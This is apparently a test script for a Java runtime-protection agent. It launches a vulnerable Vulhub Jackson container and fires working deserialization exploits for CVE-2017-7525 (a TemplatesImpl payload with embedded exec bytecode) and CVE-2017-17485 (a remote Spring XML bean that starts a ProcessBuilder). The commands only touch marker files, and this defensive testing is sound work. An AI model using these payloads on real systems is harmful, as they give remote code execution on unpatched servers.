#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

image="${OHMYRASP_VULHUB_JACKSON_IMAGE:-vulhub/spring-with-jackson:2.8.8}"
baseline_name="${OHMYRASP_VULHUB_JACKSON_BASELINE_NAME:-ohmyrasp-vulhub-jackson17485-baseline}"
protected_name="${OHMYRASP_VULHUB_JACKSON_PROTECTED_NAME:-ohmyrasp-vulhub-jackson17485-protected}"
baseline_port="${OHMYRASP_VULHUB_JACKSON_BASELINE_PORT:-19168}"
protected_port="${OHMYRASP_VULHUB_JACKSON_PROTECTED_PORT:-19169}"
xml_port="${OHMYRASP_VULHUB_JACKSON_XML_PORT:-19170}"
templates_success_file="/tmp/prove1.txt"
spring_xml_success_file="/tmp/ohmyrasp-jackson-17485-success"
baseline_dir="logs/vulhub-jackson-2.8.8-java7-baseline"
protected_dir="logs/vulhub-jackson-2.8.8-java7-protected"
xml_dir="${baseline_dir}/xml"
xml_pid=""

cleanup() {
  if [[ -n "$xml_pid" ]]; then
    kill "$xml_pid" >/dev/null 2>&1 || true
    wait "$xml_pid" >/dev/null 2>&1 || true
  fi
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

wait_for_http() {
  local name="$1"
  local port="$2"
  local dir="$3"
  local status

  for attempt in $(seq 1 120); do
    status="$(curl -sS -o "${dir}/ready-${attempt}.response" -w "%{http_code}" \
      "http://127.0.0.1:${port}/" 2>/dev/null || true)"
    if [[ "$status" != "000" ]]; then
      printf 'http_ready_attempt=%s status=%s\n' "$attempt" "$status" >> "${dir}/attempts.log"
      return
    fi
    sleep 1
  done

  docker logs "$name" >&2 || true
  echo "${name} did not expose Jackson application at ${port}" >&2
  exit 1
}

write_spel_xml() {
  mkdir -p "$xml_dir"
  cat > "${xml_dir}/spel.xml" <<XML
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans
     http://www.springframework.org/schema/beans/spring-beans.xsd
">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg>
            <array>
                <value>touch</value>
                <value>${spring_xml_success_file}</value>
            </array>
        </constructor-arg>
        <property name="any" value="#{ pb.start() }"/>
    </bean>
</beans>
XML
}

start_xml_server() {
  python3 -m http.server "$xml_port" --bind 0.0.0.0 --directory "$xml_dir" \
    > "${baseline_dir}/xml-http.log" 2>&1 &
  xml_pid="$!"

  for attempt in $(seq 1 30); do
    if curl -fsS "http://127.0.0.1:${xml_port}/spel.xml" >/dev/null 2>&1; then
      printf 'xml_ready_attempt=%s\n' "$attempt" >> "${baseline_dir}/attempts.log"
      return
    fi
    sleep 1
  done

  echo "temporary Jackson Spring XML server did not start on ${xml_port}" >&2
  exit 1
}

write_templates_payload() {
  local output="$1"
  cat > "$output" <<'JSON'
{
  "param": [
    "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    {
      "transletBytecodes": [
        "yv66vgAAADMAKAoABAAUCQADABUHABYHABcBAAVwYXJhbQEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAcTGNvbS9iMW5nei9zZWMvbW9kZWwvVGFyZ2V0OwEACGdldFBhcmFtAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAhzZXRQYXJhbQEAFShMamF2YS9sYW5nL09iamVjdDspVgEAClNvdXJjZUZpbGUBAAtUYXJnZXQuamF2YQwABwAIDAAFAAYBABpjb20vYjFuZ3ovc2VjL21vZGVsL1RhcmdldAEAEGphdmEvbGFuZy9PYmplY3QBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAZAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAGwAcCgAaAB0BABV0b3VjaCAvdG1wL3Byb3ZlMS50eHQIAB8BAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAhACIKABoAIwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACUKACYAFAAhAAMAJgAAAAEAAgAFAAYAAAAEAAEABwAIAAEACQAAAC8AAQABAAAABSq3ACexAAAAAgAKAAAABgABAAAABgALAAAADAABAAAABQAMAA0AAAABAA4ADwABAAkAAAAvAAEAAQAAAAUqtAACsAAAAAIACgAAAAYAAQAAAAoACwAAAAwAAQAAAAUADAANAAAAAQAQABEAAQAJAAAAPgACAAIAAAAGKiu1AAKxAAAAAgAKAAAACgACAAAADgAFAA8ACwAAABYAAgAAAAYADAANAAAAAAAGAAUABgABAAgAGAAIAAEACQAAABYAAgAAAAAACrgAHhIgtgAkV7EAAAAAAAEAEgAAAAIAEw=="
      ],
      "transletName": "a.b",
      "outputProperties": {}
    }
  ]
}
JSON
}

write_payload() {
  local output="$1"
  python3 - "$xml_port" "$output" <<'PY'
import json
import sys

xml_port = sys.argv[1]
output = sys.argv[2]
payload = {
    "param": [
        "org.springframework.context.support.FileSystemXmlApplicationContext",
        "http://host.docker.internal:%s/spel.xml" % xml_port,
    ]
}
with open(output, "w", encoding="utf-8") as handle:
    json.dump(payload, handle)
    handle.write("\n")
PY
}

send_payload() {
  local port="$1"
  local payload="$2"
  local output="$3"
  curl -sS -o "$output" -w "%{http_code}" \
    -H 'Content-Type: application/json' \
    --data-binary "@${payload}" \
    "http://127.0.0.1:${port}/exploit" || true
}

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

write_spel_xml
start_xml_server
templates_payload="${baseline_dir}/cve-2017-7525-payload.json"
spring_xml_payload="${baseline_dir}/cve-2017-17485-payload.json"
write_templates_payload "$templates_payload"
write_payload "$spring_xml_payload"

docker run -d --name "$baseline_name" \
  --add-host host.docker.internal:host-gateway \
  -p "${baseline_port}:8080" \
  "$image" >/dev/null

wait_for_http "$baseline_name" "$baseline_port" "$baseline_dir"
docker exec "$baseline_name" rm -f "$templates_success_file" "$spring_xml_success_file"
templates_status="$(send_payload "$baseline_port" "$templates_payload" "${baseline_dir}/cve-2017-7525.response")"
printf 'templates_status=%s\n' "$templates_status" >> "${baseline_dir}/attempts.log"
if ! docker exec "$baseline_name" sh -c "test -e '${templates_success_file}'"; then
  sed -n '1,180p' "${baseline_dir}/cve-2017-7525.response" >&2 || true
  docker logs "$baseline_name" >&2 || true
  echo "baseline Jackson CVE-2017-7525 did not create ${templates_success_file}" >&2
  exit 1
fi
printf 'templates_marker=present\n' >> "${baseline_dir}/attempts.log"

spring_xml_status="$(send_payload "$baseline_port" "$spring_xml_payload" "${baseline_dir}/cve-2017-17485.response")"
printf 'spring_xml_status=%s\n' "$spring_xml_status" >> "${baseline_dir}/attempts.log"
if ! docker exec "$baseline_name" sh -c "test -e '${spring_xml_success_file}'"; then
  sed -n '1,180p' "${baseline_dir}/cve-2017-17485.response" >&2 || true
  docker logs "$baseline_name" >&2 || true
  echo "baseline Jackson CVE-2017-17485 did not create ${spring_xml_success_file}" >&2
  exit 1
fi
printf 'spring_xml_marker=present\n' >> "${baseline_dir}/attempts.log"

docker run -d --name "$protected_name" \
  --add-host host.docker.internal:host-gateway \
  -p "${protected_port}:8080" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e "JAVA_TOOL_OPTIONS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
  "$image" >/dev/null

sleep 3
docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
if ! grep -q 'Unsupported major.minor version 52.0' "${protected_dir}/container.log"; then
  sed -n '1,160p' "${protected_dir}/container.log" >&2
  echo "Jackson Java 7 protected probe did not show Java 8 agent class-version mismatch" >&2
  exit 1
fi
if docker ps --filter "name=${protected_name}" --filter "status=running" --format '{{.Names}}' | grep -q .; then
  echo "Jackson Java 7 container unexpectedly kept running with Java 8 agent" >&2
  exit 1
fi

echo "vulhub Jackson CVE-2017-7525/CVE-2017-17485 Java7 legacy boundary passed"
